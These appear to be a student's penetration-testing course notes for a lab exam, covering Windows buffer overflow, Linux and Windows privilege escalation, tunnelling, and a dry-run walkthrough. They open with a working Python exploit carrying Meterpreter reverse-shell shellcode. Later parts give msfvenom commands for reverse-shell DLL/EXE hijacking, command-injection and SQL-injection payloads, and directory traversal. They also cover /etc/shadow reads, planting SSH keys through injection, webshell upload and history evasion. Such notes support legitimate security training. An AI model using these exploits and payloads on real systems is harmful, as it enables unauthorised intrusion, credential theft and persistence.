WINDOWS BUFFER OVERFLOW SCRIPTING
____________________________________
import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 20

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.37.61 LPORT=7777 -b "\x00" -f python

buf += b"\xdb\xc5\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x59\xbf"
buf += b"\x9b\x83\x8f\x36\x31\x78\x19\x83\xc0\x04\x03\x78"
buf += b"\x15\x79\x76\x73\xde\xf2\x79\x8c\x1f\x6c\xf3\x69"
buf += b"\x2e\xbe\x67\xf9\x03\x0e\xe3\xaf\xaf\xe5\xa1\x5b"
buf += b"\x3b\x8b\x6d\x55\xc4\x64\xd9\xdf\x1c\x4b\xe5\x4c"
buf += b"\x5c\xca\x99\x8e\xb1\x2c\xa3\x40\xc4\x2d\xe4\x16"
buf += b"\xa2\xc2\xb8\xff\xc7\x4e\x2d\x8b\x9a\x52\x4c\x5b"
buf += b"\x91\xea\x36\xde\x66\x9e\x8a\xe1\xb6\xd5\x4b\xc2"
buf += b"\xbd\xa1\x73\x03\x11\x61\x01\xca\xe1\xbd\x38\x32"
buf += b"\x40\x36\x0e\x47\x52\x9e\x5e\x97\x94\xd1\xac\xbb"
buf += b"\x16\x2a\x96\x23\x6d\x40\xe4\xde\x76\x93\x96\x04"
buf += b"\xf2\x03\x30\xce\xa4\xe7\xc0\x03\x32\x6c\xce\xe8"
buf += b"\x30\x2a\xd3\xef\x95\x41\xef\x64\x18\x85\x79\x3e"
buf += b"\x3f\x01\x21\xe4\x5e\x10\x8f\x4b\x5e\x42\x77\x33"
buf += b"\xfa\x09\x9a\x22\x7a\xf2\x64\x4b\x26\x64\xa8\x86"
buf += b"\xd9\x74\xa6\x91\xaa\x46\x69\x0a\x25\xea\xe2\x94"
buf += b"\xb2\x7b\xe4\x26\x6c\xc3\x65\xd9\x8d\x33\xaf\x1e"
buf += b"\xd9\x63\xc7\xb7\x62\xe8\x17\x37\xb7\x84\x1d\xaf"
buf += b"\x32\x6a\x07\x12\x2b\x88\x47\x72\xca\x05\xa1\xda"
buf += b"\x5c\x45\x7e\x9b\x0c\x25\x2e\x73\x47\xaa\x11\x63"
buf += b"\x68\x61\x3a\x0e\x87\xdf\x12\xa7\x3e\x7a\xe8\x56"
buf += b"\xbe\x51\x94\x59\x34\x53\x68\x17\xbd\x16\x7a\x40"
buf += b"\xda\xd8\x82\x91\x4f\xd8\xe8\x95\xd9\x8f\x84\x97"
buf += b"\x3c\xe7\x0a\x67\x6b\x74\x4c\x97\xea\x4c\x26\xae"
buf += b"\x78\xf0\x50\xcf\x6c\xf0\xa0\x99\xe6\xf0\xc8\x7d"
buf += b"\x53\xa3\xed\x81\x4e\xd0\xbd\x17\x71\x80\x12\xbf"
buf += b"\x19\x2e\x4c\xf7\x85\xd1\xbb\x8b\xc2\x2d\x39\xa4"
buf += b"\x6a\x45\xc1\xf4\x8a\x95\xab\xf4\xda\xfd\x20\xda"
buf += b"\xd5\xcd\xc9\xf1\xbd\x45\x43\x94\x0c\xf4\x54\xbd"
buf += b"\xd1\xa8\x55\x32\xca\x5b\x2f\x3b\xed\x9c\xd0\x55"
buf += b"\x8a\x9d\xd0\x59\xac\xa2\x06\x60\xda\xe5\x9a\xd7"
buf += b"\xd5\x50\xbe\x7e\x7c\x9a\xec\x81\x55"

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("10.50.34.194",9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 6    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Post Exploitation
---------------------
/etc/shadow
/etc/passwd
scheduled tasks/crontabs
processes
services
registry keys

ssh using stolen keys*******

User Enumeration
----
net user and cat /etc/passwd
net groups
net localgroup

Process Enumeration
----
tasklist /v and ps -elf

Service Enumeration
----
tasklist /svc and chkconfig, systemctl --type=service

Network Enumeration
----
ipconfig /all and ipconfig -a, ip a
/etc/hosts

find / -iname (not case sensitive) "<file>"

Valuable Directories to search in
----------------
/tmp, /var/tmp, /etc, /home, /

192.168.28.100 Comrade SSH key


$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 7    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Linux Priv Escalation
------------------------
sudo -l
syslog and rsyslog, logging files (remote logging is rsyslog)
/etc/syslog, /etc/ryslog.conf

sudo -l (gtfobins)
find / -perm * (SUID/SGID also gtfobins)
unset HISTFILE
syslog and rsyslog (rsyslog.conf)

Situational Awareness
---------------------
cat /etc/hosts
crontab
sudo -l (put binary file into gtfobins)
find / -type f -perm /4000 -ls 2>/dev/null (2000 is SGID, 4000 is SUID, 6000 is both)
can write to /tmp
ls -a (hidden files)
cat /etc/crontab
echo $PATH (locate echo, shows where a command is at)
PATH=.:$PATH (adds a "." to the path)

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 8    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Windows Priv Escalation
------------------
System is the closest account to root on Windows
Two default privileged accounts are System and Administrator
SIDs

DLL Search Order
----
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
The directory the Application was run from
The directory specififed in the C+ function GetSystemDirectory()
The directory specified in the C+ function GetWindowsDirectory()
The current directory

Windows Integrity Mechanism
----
Integrity Levels
--
UNTRUSTED - Anonymous SID access tokens
LOW - Everyone SID access token
MEDIUM - Authenticated Users
HIGH - Administrators
SYSTEM - System services (LocalSystem, LocalService, NetworkService)

AutoElevate Executables
----
Requested Execution Levels:
  asInvoker
  highestAvailable
If an application requires you to specify that you want to run as administrator then it is asInvoker

Scheduled Tasks and Services
----
Items to evaluate include:
  Write permissions
  Non-Standard Locations
  Unquoted Executable Paths
  Vulnerabilities in Executables
  Permissions to Run as SYSTEM

Other Vulnerabilities
----
Unpatched Kernel Vulnerabilities
Unpatched Systems
Unpatched Applications

Persistence
----
Survives:
Reboots
Credential Changes
DHCP IP reassignment
Etc

Considerations:
File naming
File location
Timestomping
Port selection

Registry
----
HKEY_LOCALMACHINE\Software\Microsoft\Windows\CurrentVersion\Run & RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run & RunOnce

Services
----
At Startup
Perform Multiple Functions
Typically require Administrative Access

System usage
----
Where should you run commands from?
Check system resources
--
wmic
net
netstat

Important Microsoft Event IDs
----
4624/4625 - Successful/failed login
4720 - Account created
4672 - Administrative user logged on
7045 - Service created

Demos
----
use rdp to attack a windows machine

Elevating privieleges
--------
check services
services in search bar
sort services by the description

DLL Hijacking
----
use procmon
filter by "Process Name" "Contains" "putty.exe", "Path" "Contains" ".dll", "Result" "is" "NAME NOT FOUND"
run the process with procmon open
select one of the DLLs from the list

From Lin-ops
++++
msfvenom -p windows/shell_reverse_tcp LHOST=<OwnIP> LPORT=<RHP> -f dll > <DLLname>
scp from the windows machine to the linux machine the DLL
scp <user>@<linux machine IP>:<DLLname> . (On windows machine)
msfconsole
use multi/handler
set payload windows/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT <RHP above>
show options to check
run
should get a shell prompt

if no shell prompt
--
msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f dll > SSPICLI.dll

can be used to create account, add it to administrator group, add it to remote desktop users

EXE Hijacking
----
msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f exe > putty.exe

EXAM
-----------------
31 questions each is 5 points
After part 1 is finished you cannot go back
16 part 1 15 part 2
questions more along the lines of inferring what to do
test question formatting is similar to CTF


##################################################################################
##################################################################################
#####                                                                        #####
#####                               Tunnels                                  #####
#####                                                                        #####
##################################################################################
##################################################################################


student@lin-ops:~$ ssh -MS /tmp/jumper student@10.50.37.139
student@lin-ops:~$ ssh -S /tmp/jumper dummy -O forward -L6534:192.168.28.105:2222
student@lin-ops:~$ ssh -MS /tmp/jumping comrade@127.0.0.1 -p 6534
student@lin-ops:~$ ssh -S /tmp/jumping dummy -O forward -L8746:192.168.28.27:22
student@lin-ops:~$ ssh -S /tmp/jumping dummy -O forward -L7890:192.168.28.5:3389


##################################################################################
##################################################################################
#####                                                                        #####
#####                               Tunnels                                  #####
#####                                                                        #####
##################################################################################
##################################################################################

CTF Focusing
---------------------

!!!!!! /ETC/HOSTS !!!!!!

Binary
--

Exploit
--
LINUX

Exploit research
--
Google

Linux Exploit
--
GTFOBINS
EXPLOIT DEV
IMPORTANT FILES
USER ACCOUNTS IN /etc/passwd
CRON

Linux Post Exploitation
--
TEMP DIRECTORY
RSYSLOG
/home
USERS HOME DIRECTORIES

Windows Post Exploitation
--
USERS HOME DIRECTORIES
DOWNLOADS
SYSTEM32

Priv Esc
--
RUNKEYS
SCHTASKS
SERVICES

Recon
--
USE EYEBALLS READ THE TEXT
VIEW PAGE SOURCE

SQL Injection
--
BETTER KNOW HOW TO USE IT, OR WILL NOT PASS
KNOW HOW TO DO ALL OF THE PROCESS
PULL INFORMATION OUT OF THE TABLES
ONLY POTENTIAL USERNAMES AND PASSWORDS OUT OF LOGIN FIELDS
GET AND POST

Web Exploit
--
SSH KEYGEN
CODE INJECTION
CODE INJECTION VS DIRECTORY TRAVERSAL
AFTER GETTING CODE INJECTION SEE WHO AND WHERE YOU ARE AND THEN SSH KEYGEN

Windows Exploitation
--
SERVICES
SCHTASKS
IF ABLE TO RENAME EXE THEN EXE REPLACEMENT
IF NOT THEN DLL HIJACK






DRYRUN
-----------------------
10.50.50.85

--script http-robots.txt.nse
--script http-sql-injection.nse


DRYRUN WALKTHROUGH
-----------------------
scan the IP address with (nmap -Pn -T4 --min-rate 654874654 <IP> -p20,21,22,2222,4444,4242,80,8080,3389) 
scan for all ports if there is an abnormal port that was mentioned in the question
nc <IP> 22
nc <IP> 80
confirm services on open ports
nmap -Pn -T4 --script=http-enum.nse
nikto -h <IP>
Run both, sometimes nikto will show different results than http-script
go to website after obtaining inital information about the IP
go to where the http-enum and nikto were telling
test out the credentials given from the scripts
if credentials do not work
try a SQL injection using the POST method if possible and if that does not work do a GET method
add a question mark to the end of the web address and then paste the raw information from the inspect page
ROT13 and magic in cyberchef
try command injection and directory traversal on the website if possible
command injection - ; whoami
directory traversal ../../../../../../../../../../../../../../etc/hosts
malicious file upload (need a place to upload files and where the file was uploaded)

From the host that we gained access to (PublicFacingWebsite)
bash to get a bash shell (if that does not work then /bin/bash, if that doesnt work, get fucked)
whoami && hostname
cat /etc/hosts
cat /etc/passwd
cat /etc/shadow
sudo -l
find / -type f -perm /4000 2>/dev/null
ls /tmp
ls /var/tmp
(this machine had no method of escalation)
will be told if need escalation

from lin ops
ssh -MS /tmp/t1 user2@<IP of Public>
ssh -S /tmp/t1 dummy -O forward -D9050 a
proxychains nmap -Pn -T4 --min-rate 451316416 <IP of WebApp> -p 80,22,2222,4444,4242,20,21,8080,8888,3389
if nmap is not working run an nmap scan with -sT
banner grab to find the services running on the ports that were found in the nmap scan
ssh -S /tmp/t1 -O forward -L8080:<IP of WebApp>:80 asd

in firefox
if there is a table when you submit then it is SQL injection
product=(test out the numbers starting at 1 (with OR 1=1;# after the product))
test all of the options to see which options are broken, if one stops working then there is another as long as it is identified and noted
after the product=7(UNION select 1,2,3;# (cannot be less than 3 in THIS table due to there being 3 options in the table when proven vulnerable))
shown in 1,3,2 (check for the order at the bottom of the table where the numbers will be and any added characters that were not included in the GET request)
DO THE GOLDEN STATEMENT THAT IS FOUND IN THE GUIDE
UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
search the table that is given for any outputs that are unique or weird
open another tab with the GOLDEN STATEMENT to always have the table on the browser
record credentials that are given in the SQL injection table

on lin ops
ping sweep to scan for hosts that are up that we do not have
ping sweep
---------for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done---------
if it is a router, it will have a low ping, no return on nmap scans and the ttl is weirder than the others
scan the network that was found in the ping sweep for open ports
proxychains -Pn -sT -T4 nmap <IP> -p20,21,22,2222,4444,4242,8080,8888,3389 
run a full scan after getting intel to act on (all ports)
proxychains nc <IP> 22 to banner grab to verify SSH
ssh -S /tmp/t1 -O forward -L1111:<IP>:22 a
ssh -MS /tmp/t2 Aaron@127.0.0.1 -p1111 (try all of the credentials given previously)

on RoundSensor
whoami && hostname
sudo -l
find / -type f /4000 2>/dev/null
ls -la /tmp
ls -la /var/tmp
use gtfobins to find what is vulnerable to privilege escalation
whoami to verify escalation

on lin ops
ssh -S /tmp/t1 -O cancel -D9050 a
ssh -S /tmp/t2 -O forward -D9050 a
proxychains nmap -sT -Pn -T4 --min-rate 46584315464 <IP> -p20,21,22,2222,4444,4242,8080,8888,3389
ssh -S /tmp/t2 -O forward -L9090:<IP of windows>:9999(or secure server port) a

if secure server is open then a buffer overflow would need to be run
using wimbuff.py
change the ip and the port in the wimbuff.py script then run it

on lin ops
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 7777
run

if this does not work then there is another way (HINT HINT)
ssh -S /tmp/t2 -O forward -L3330:<IP of windows>:3389 a
xfreerdp /v:localhost:3330 /u:LRoth /p:anotherpassword4THEages /dynamic-resolution
check services look for blank descriptions

if doing DLL hijacking
scp the DLL onto the windows machine, replace the old DLL with the one that will be hijacking and then run the program (might require a system restart)

review after the dryrun
-----------------------
31 questions all questions are 5 points need 22
part 1 is 16 questions contains sql
part 2 is 15 questions

sql injections are the biggest reason for failing
buffer overflow will not be its own category it will be in the exploitation of whichever system it is needed on
questions are named after the system needed
check what system you are on before attempting the question
/root is linux user root's home directory
3 hours part 1
1 hour lunch between the 2
3 hours part 2

100% part 1 and cruise through part 2
SQL injection seems to be the biggest part of part 1

Exam Review
-----------------------
always look for robots.txt on websites
command injection
path
uploads

command injection
----
; whoami (testing for command injection)
;(ends first command and runs the next command regardless)
need home directory for ssh keygen, authorized keys goes into the home directory
; cat /etc/passwd (can inspect page source if the output is ugly)

*********************************************************************************
*********************************************************************************
***********************             SSH-KEYGEN              *********************
*********************************************************************************
*********************************************************************************

ssh-keygen -b 4096
upload public key, do not upload private key
; verify that the .ssh directory exists in their home directory
if not
; mkdir /<home directory>/.ssh
; echo "<INSERT PUBLIC KEY HERE>" >> /<home directory>/.ssh/authorized_keys
ssh <user>@<IP> (if it asks for a password then you did it wrong)
if it asks for a password then try all of the steps again

*********************************************************************************
*********************************************************************************
***********************             SSH-KEYGEN              *********************
*********************************************************************************
*********************************************************************************

copy and paste the malicious file upload from the guide into a file called "webshell.php"
find where the file uploads to
check to make sure file uploads
click on the file that was uploaded to the website
limited shell
ssh keygen steps



                  ___________________
                 /                    \
                /                      \ 
               /                        \
              /                          \
_____________/                            \____________________


























